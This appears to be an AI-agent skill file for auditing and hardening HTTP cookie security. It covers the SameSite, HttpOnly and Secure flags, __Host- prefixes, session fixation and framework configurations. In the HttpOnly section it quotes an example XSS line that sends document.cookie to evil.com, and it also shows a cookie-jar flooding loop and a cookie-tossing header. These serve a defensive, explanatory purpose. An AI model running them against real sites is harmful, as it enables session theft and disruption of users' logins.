---
name: cookie-security
description: >
  Comprehensive HTTP cookie security audit and hardening skill. Audits web applications
  for insecure cookie attributes (missing HttpOnly, Secure, SameSite), domain and path
  scoping misconfigurations, cookie tossing attacks from untrusted subdomains, session
  fixation, cookie jar overflow/eviction vulnerabilities, supercookie tracking vectors,
  and missing __Host- and __Secure- cookie prefixes. Activate when the user asks to "audit
  cookie security", "SameSite cookie review", "HttpOnly Secure flags check", "cookie tossing
  vulnerability", "session fixation audit", "prefix __Host- cookie", or "cookie scope audit".
triggers:
  - "cookie security"
  - "cookie audit"
  - "SameSite"
  - "HttpOnly"
  - "Secure flag"
  - "cookie prefixes"
  - "__Host-"
  - "__Secure-"
  - "cookie tossing"
  - "session fixation"
  - "cookie domain scope"
  - "cookie jar overflow"
  - "cookie hardening"
version: 1.0.0
author: bug-finder-kit
category: security
risk: safe
tags: "[cookie-security, samesite, httponly, secure-flag, cookie-prefixes, session-fixation, cookie-tossing, domain-scoping, supercookies]"
date_added: "2026-10-23"
---

# Cookie Security & Session Token Hardening Audit

> HTTP cookies remain the foundational mechanism for web session management, stateful
> authentication, and CSRF defense. However, improper configuration of cookie attributes,
> overly permissive domain scopes, or omission of modern browser security prefixes (`__Host-`)
> exposes applications to session hijacking via XSS, cross-site request forgery, cookie tossing
> from compromised subdomains, and session fixation attacks.

---

## Cookie Security Taxonomy & RFC 6265bis Model

```
Cookie Security Attack Surface
  ├── 1. Core Transport & Access Flags
  │     ├── Missing HttpOnly (session token accessible via document.cookie / XSS)
  │     ├── Missing Secure (cookie transmitted in plaintext over HTTP connections)
  │     └── Missing or weak SameSite (CSRF exposure on state-changing endpoints)
  ├── 2. Scope & Inheritance Misconfigurations
  │     ├── Explicit Domain attribute (exposes cookie to all current & future subdomains)
  │     ├── Overly broad Path attribute (sharing cookies across multi-tenant paths)
  │     └── Omission of __Host- and __Secure- cookie prefixes
  ├── 3. Session Lifecycle Vulnerabilities
  │     ├── Session fixation (retaining pre-login session ID post-authentication)
  │     ├── Absence of session expiration (indefinite Max-Age / Expires)
  │     └── Insecure logout (deleting cookie in client but retaining session in DB)
  ├── 4. Cross-Origin & Cross-Domain Exploitation
  │     ├── Cookie tossing (malicious subdomain writing shadow cookies to parent domain)
  │     ├── Cookie jar overflow (flooding cookie jar to force eviction of auth tokens)
  │     └── SameSite=None without Secure (cross-site leakage)
  └── 5. Tracking & Privacy Abuse
        ├── Supercookies set on Public Suffixes (.com, .co.uk)
        ├── Evercookies / canvas / HSTS cache persistence
        └── Unpartitioned third-party tracking cookies (CHIPS / Partitioned audit)
```

---

## Phase 1: Core Security Flags (`HttpOnly`, `Secure`)

### 1. The `HttpOnly` Directive
The `HttpOnly` flag instructs the browser that the cookie must not be accessible via client-side
scripts (e.g. `document.cookie`).

- **Risk if missing:** Any Cross-Site Scripting (XSS) vulnerability anywhere on the application
  allows immediate theft of session identifiers (`fetch('https://evil.com/steal?c=' + document.cookie)`).
- **Audit Rule:** Any cookie storing a session token, authentication credential, or sensitive user
  identity **must** have the `HttpOnly` directive.

### 2. The `Secure` Directive
The `Secure` flag instructs the browser that the cookie must only be transmitted over encrypted
(HTTPS) connections.

- **Risk if missing:** A man-in-the-middle (MITM) on public Wi-Fi or an unencrypted network can
  intercept the session cookie if the user accidentally visits `http://example.com` or if a mixed-content
  resource is requested.
- **Audit Rule:** All authentication and state-bearing cookies must include `Secure`.

### Vulnerable vs. Secure Header Comparison

```http
❌ VULNERABLE: Session cookie missing all hardening flags
Set-Cookie: session_id=s%3A7a9b8c; Path=/

⚠️ PARTIALLY SECURED: Still accessible to JavaScript and subdomains
Set-Cookie: session_id=s%3A7a9b8c; Secure; Domain=example.com; Path=/

✅ FULLY HARDENED: Protected against XSS theft, MITM sniffing, and CSRF
Set-Cookie: __Host-session_id=s%3A7a9b8c; Secure; HttpOnly; SameSite=Lax; Path=/
```

---

## Phase 2: `SameSite` Attribute Matrix & CSRF Defense

The `SameSite` attribute controls whether cookies are sent with cross-site requests.

### Behavior Comparison Table

| `SameSite` Setting | Same-Origin Navigation (`a.com` -> `a.com`) | Cross-Site Top-Level Link (`b.com` -> `<a href="a.com">`) | Cross-Site Subresource (`b.com` -> `<img src="a.com">`) | Cross-Site POST Form (`b.com` -> `<form action="a.com">`) |
|---|---|---|---|---|
| **`Strict`** | ✅ Sent | ❌ Blocked | ❌ Blocked | ❌ Blocked |
| **`Lax`** (Default) | ✅ Sent | ✅ Sent (Safe GET only) | ❌ Blocked | ❌ Blocked |
| **`None`** | ✅ Sent | ✅ Sent | ✅ Sent (Requires `Secure`) | ✅ Sent (Requires `Secure`) |

### Key Vulnerabilities & Traps:
1. **Relying on `SameSite=Lax` for State-Changing GETs:**
   If your application performs state changes via `GET` requests (e.g. `/api/transfer?amount=100&to=bob`),
   `SameSite=Lax` **does not protect you**! Browsers send `SameSite=Lax` cookies on top-level link clicks.
2. **`SameSite=None` without `Secure`:**
   Modern browsers reject any `Set-Cookie` header specifying `SameSite=None` unless `Secure` is also set.
3. **The "Lax+POST" 2-Minute Window:**
   In Chromium-based browsers, cookies without an explicit `SameSite` attribute default to Lax, but with
   a legacy 2-minute exception for top-level cross-site POSTs ("Lax-allowing-unsafe"). Always specify
   `SameSite=Lax` or `SameSite=Strict` explicitly rather than relying on browser defaults.

---

## Phase 3: Domain & Path Scoping Vulnerabilities

### The `Domain` Attribute Danger
When a `Set-Cookie` header specifies an explicit `Domain=example.com`:
- The browser will send the cookie to `example.com` **AND ALL SUBDOMAINS** (`blog.example.com`, `dev.example.com`, `untrusted-user-app.example.com`).
- If any subdomain is compromised or hosts user-uploaded content with XSS, the attacker on that subdomain can read the parent domain's cookies!

### Omitting the `Domain` Attribute (Host-Only Cookies)
If you omit the `Domain` attribute entirely:
- The cookie becomes a **host-only cookie**.
- The browser will send it **only** to the exact domain that set it (`example.com`), and **never** to subdomains.

```http
❌ DANGEROUS: Leaks to all current and future subdomains
Set-Cookie: session=xyz; Domain=example.com; Secure; HttpOnly

✅ SAFER: Host-only cookie, not accessible to subdomains
Set-Cookie: session=xyz; Secure; HttpOnly; Path=/
```

### Path Attribute Limitations
The `Path` attribute (e.g. `Path=/admin`) is **not a security boundary**:
- Any page on the same origin (e.g. `example.com/public`) can access cookies scoped to `Path=/admin` by loading an iframe pointing to `/admin` and reading its `document.cookie` if `HttpOnly` is missing.
- Always set `Path=/` for standard web apps, and enforce URL-based authorization on the server.

---

## Phase 4: Cookie Prefixes (`__Host-` and `__Secure-`)

RFC 6265bis introduces cookie name prefixes. Browsers enforce cryptographic assertions
before accepting any cookie whose name begins with these prefixes:

### 1. The `__Host-` Prefix (Maximum Protection)
A cookie starting with `__Host-` is rejected by the browser unless **all** of the following conditions are met:
- Must have the `Secure` flag.
- Must originate from a secure HTTPS origin.
- **Must NOT contain a `Domain` attribute** (strictly host-only).
- **Must have `Path=/`**.

```http
✅ GOLD STANDARD: Immune to subdomain cookie tossing and path restrictions
Set-Cookie: __Host-session=f8b2c4e1a0; Secure; HttpOnly; SameSite=Lax; Path=/
```

### 2. The `__Secure-` Prefix
A cookie starting with `__Secure-` is rejected unless:
- Must have the `Secure` flag.
- Must originate from a secure HTTPS origin.
- (Allows `Domain` and `Path` attributes, making it suitable for multi-subdomain SSO).

```http
✅ SECURE CROSS-SUBDOMAIN COOKIE:
Set-Cookie: __Secure-sso_token=e4d2a1b9; Domain=example.com; Secure; HttpOnly; SameSite=Lax; Path=/
```

---

## Phase 5: Session Fixation & Lifecycle Management

Session fixation occurs when an application keeps an existing session identifier across a privilege
boundary (such as user login).

### Attack Scenario:
1. Attacker obtains a fresh session identifier `SESSION_123` from the target site.
2. Attacker forces `SESSION_123` into the victim's browser (via link parameter, cookie tossing, or XSS).
3. Victim logs into their account on the target site.
4. If the server does **not regenerate the session ID upon authentication**, `SESSION_123` now belongs
   to the authenticated victim.
5. Attacker uses `SESSION_123` to access the victim's authenticated account.

### Vulnerable Pattern: Express / Node.js
```javascript
// ❌ VULNERABLE: Retaining old session on login
app.post('/login', async (req, res) => {
  const user = await authenticate(req.body.username, req.body.password);
  if (user) {
    // Keeps existing req.sessionID - vulnerable to session fixation!
    req.session.userId = user.id;
    res.json({ success: true });
  }
});
```

### Secure Pattern: Express Session Regeneration
```javascript
// ✅ SAFE: Regenerate session ID immediately upon authentication
app.post('/login', async (req, res) => {
  const user = await authenticate(req.body.username, req.body.password);
  if (user) {
    req.session.regenerate((err) => {
      if (err) return res.status(500).json({ error: 'Session error' });
      
      req.session.userId = user.id;
      req.session.role = user.role;
      req.session.save((saveErr) => {
        if (saveErr) return res.status(500).json({ error: 'Save error' });
        res.json({ success: true });
      });
    });
  }
});
```

---

## Phase 6: Subdomain Cookie Tossing & Shadowing Attacks

### How Cookie Tossing Works:
If an attacker controls a subdomain (`user-content.example.com` or `dev.example.com`):
1. The attacker issues a cookie targeting the parent domain:
   `Set-Cookie: session=ATTACKER_CHOSEN_VAL; Domain=example.com; Path=/`
2. When the user visits `example.com`, their browser sends **both** cookies:
   `Cookie: session=ATTACKER_CHOSEN_VAL; session=LEGITIMATE_SESSION`
3. Browsers do not indicate which cookie came from which domain in the `Cookie:` header!
4. If the backend reads the first cookie encountered, it processes the attacker's value, enabling
   login CSRF, session fixation, or application desync.

### Remediation:
- Use the **`__Host-` prefix** for all session cookies! Browsers strictly forbid subdomains from
  overwriting or setting `__Host-` cookies on parent domains.
- Isolate untrusted user content onto a completely separate domain registered on the Public Suffix List
  (e.g. `github.io` vs `github.com`).

---

## Phase 7: Cookie Jar Overflow & Eviction DoS

Web browsers enforce hard limits on cookies:
- Approximately 180 to 200 cookies per domain (varies by browser engine).
- Maximum cookie size: 4096 bytes per cookie.

### Attack Vector:
A compromised subdomain or a script on an adjacent path can generate hundreds of dummy cookies:
```javascript
for (let i = 0; i < 300; i++) {
  document.cookie = `junk_${i}=${"A".repeat(100)}; Domain=example.com; Path=/`;
}
```
As the cookie jar exceeds its limit, the browser begins evicting older cookies on a First-In-First-Out
(FIFO) or Least-Recently-Used basis. If the critical `session_id` or CSRF token is evicted, the user
is silently logged out or subsequent authenticated requests trigger CSRF validation failures.

---

## Phase 8: Supercookies & Partitioned Cookies (CHIPS)

### Public Suffix List Protection
Browsers reject cookies set on public suffixes (`.com`, `.co.uk`, `.github.io`) to prevent one site
from setting cookies across all domains under that TLD. Verify that your application's multi-tenant
domains are registered in the [Public Suffix List](https://publicsuffix.org/).

### Modern Partitioned Cookies (`CHIPS`)
For legitimate cross-site embed scenarios (e.g. embedded payment widgets):
```http
Set-Cookie: widget_session=abc123; Secure; SameSite=None; Partitioned; Path=/
```
The `Partitioned` attribute ensures the cookie is stored in a separate jar per top-level site,
preventing cross-site tracking while allowing functionality.

---

## Phase 9: Multi-Language & Framework Hardening

### Node.js / Express (`express-session`)
```javascript
const session = require('express-session');

app.use(session({
  name: '__Host-session', // Use hardened __Host- prefix
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,        // Force HTTPS
    httpOnly: true,      // Prevent XSS read
    sameSite: 'lax',     // Mitigate CSRF
    path: '/',           // Required for __Host-
    maxAge: 1000 * 60 * 60 * 8 // 8 hours
  }
}));
```

### Python / Django (`settings.py`)
```python
# settings.py
SESSION_COOKIE_NAME = '__Host-sessionid'
SESSION_COOKIE_SECURE = True       # Transmit only over HTTPS
SESSION_COOKIE_HTTPONLY = True     # Block JS access
SESSION_COOKIE_SAMESITE = 'Lax'    # CSRF mitigation
SESSION_COOKIE_PATH = '/'
SESSION_EXPIRE_AT_BROWSER_CLOSE = True

CSRF_COOKIE_NAME = '__Host-csrftoken'
CSRF_COOKIE_SECURE = True
CSRF_COOKIE_HTTPONLY = False       # Set to False only if frontend JS reads it for headers
CSRF_COOKIE_SAMESITE = 'Lax'
```

### Java / Spring Boot (`application.yml`)
```yaml
server:
  servlet:
    session:
      cookie:
        name: __Host-JSESSIONID
        secure: true
        http-only: true
        same-site: lax
        path: /
```

### PHP (`php.ini` or session start)
```php
session_start([
    'name' => '__Host-PHPSESSID',
    'cookie_secure' => true,
    'cookie_httponly' => true,
    'cookie_samesite' => 'Lax',
    'cookie_path' => '/',
    'use_strict_mode' => true
]);
```

---

## Phase 10: Automated PowerShell & Curl Scanning Commands

### 1. Inspect Live Server Cookie Headers via Curl
```bash
curl -I -s -k "https://app.example.com" | grep -i "Set-Cookie"
```

### 2. PowerShell Automated Cookie Audit Script
```powershell
# PowerShell Cookie Security Auditor
param([string]$TargetUrl = "https://example.com")

Write-Host "Auditing cookies for: $TargetUrl" -ForegroundColor Cyan
$response = Invoke-WebRequest -Uri $TargetUrl -Method Head -MaximumRedirection 0 -SkipCertificateCheck -ErrorAction SilentlyContinue

$cookies = $response.Headers["Set-Cookie"]
if (-not $cookies) {
    Write-Host "No Set-Cookie header returned." -ForegroundColor Yellow
    exit
}

foreach ($cookie in $cookies) {
    Write-Host "`nAnalyzing: $cookie" -ForegroundColor Gray
    
    $isHttpOnly = $cookie -match "HttpOnly"
    $isSecure = $cookie -match "Secure"
    $hasSameSite = $cookie -match "SameSite=(Strict|Lax|None)"
    $hasDomain = $cookie -match "Domain="
    $isHostPrefix = $cookie -match "^__Host-"

    if (-not $isHttpOnly) { Write-Host "  ❌ CRITICAL: Missing HttpOnly flag" -ForegroundColor Red }
    if (-not $isSecure) { Write-Host "  ❌ CRITICAL: Missing Secure flag" -ForegroundColor Red }
    if (-not $hasSameSite) { Write-Host "  ⚠️ WARNING: Missing explicit SameSite attribute" -ForegroundColor Yellow }
    if ($hasDomain) { Write-Host "  ⚠️ WARNING: Domain attribute is set (cookie leaks to all subdomains)" -ForegroundColor Yellow }
    if (-not $isHostPrefix) { Write-Host "  💡 RECOMMENDATION: Cookie name does not use __Host- prefix" -ForegroundColor Blue }
}
```

---

## Phase 11: Finding Template & Remediation Checklist

### Finding Template
```markdown
### [VULN-COOKIE-001] Sensitive Session Cookie Lacks HttpOnly and __Host- Prefix

- **Severity:** High
- **Target:** `Set-Cookie: session_id=...`
- **Location:** `src/middleware/auth.ts:45`
- **Flaw Description:** The primary authentication cookie `session_id` is issued without
  the `HttpOnly` flag and without modern cookie prefixes (`__Host-`). If an XSS vulnerability
  exists on any page of this origin or any subdomain, attackers can directly read the
  session token via `document.cookie` and hijack victim accounts.
- **Evidence / Code:**
  ```http
  Set-Cookie: session_id=e7b4c91a; Secure; Path=/
  ```
- **Remediation:**
  1. Add the `HttpOnly` directive to prevent JavaScript access.
  2. Add `SameSite=Lax` (or `SameSite=Strict`).
  3. Rename the cookie to `__Host-session_id` to enforce host-only scoping and path integrity.
  4. Ensure session IDs are regenerated upon user login.
- **Confidence:** High
```

### Remediation Checklist
- [ ] Add `HttpOnly` to all authentication, session, and identity cookies.
- [ ] Add `Secure` to all cookies transmitted over HTTPS.
- [ ] Explicitly configure `SameSite=Lax` or `SameSite=Strict` on stateful cookies.
- [ ] Prefix host-specific session cookies with `__Host-` and omit the `Domain` attribute.
- [ ] Regenerate session IDs immediately following user authentication (prevent session fixation).
- [ ] Clear session records on the server upon user logout, rather than merely expiring client cookies.
- [ ] Isolate user-generated content and untrusted subdomains on separate TLDs to prevent cookie tossing.
